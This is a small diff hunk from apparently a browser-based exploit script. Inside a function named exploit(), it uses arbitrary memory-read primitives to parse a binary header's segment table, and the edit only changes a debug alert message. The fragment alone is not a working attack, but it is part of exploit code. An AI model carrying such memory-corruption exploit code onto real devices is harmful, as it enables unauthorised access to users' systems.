@@ -599,7 +599,7 @@ function exploit(){
         var base_seg = null;
        // alert("nsegs test" + memory.read_i32(hdr+0x14))
         var nsegs    = memory.u32(Add(hdr, 0x14));
-        alert(memory.u32(hdr + 0x10) + nsegs*0x20)
+        alert(memory.u32(hdr + 0x10) + "segment"+ nsegs*0x20 + "sets")
         var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
         var segs     = [];
         for(var z = 0; z < nsegs; ++z)
